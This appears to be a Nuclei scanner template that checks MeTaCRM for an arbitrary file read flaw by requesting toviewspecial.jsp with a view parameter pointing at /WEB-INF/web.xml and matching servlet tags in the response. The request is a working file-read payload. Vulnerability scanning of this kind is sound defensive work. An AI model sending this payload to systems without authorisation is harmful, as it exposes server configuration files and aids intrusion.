id: MeTaCRM-toviewspecial-ReadAnyFile

info:
  name: MeTaCRM-toviewspecial-ReadAnyFile
  author: iSee857
  severity: high
  description: |
    MeTaCRM-toviewspecial-ReadAnyFile.
    
http:
  - method: GET
    path:
      - "{{BaseURL}}/business/common/toviewspecial.jsp?view=/WEB-INF/web.xml"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
      Accept-Encoding: "gzip, deflate"
      Accept-Language: "zh-CN,zh;q=0.9"
      Upgrade-Insecure-Requests: "1"
      
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<servlet-mapping>"
          - "<servlet>"
        part: body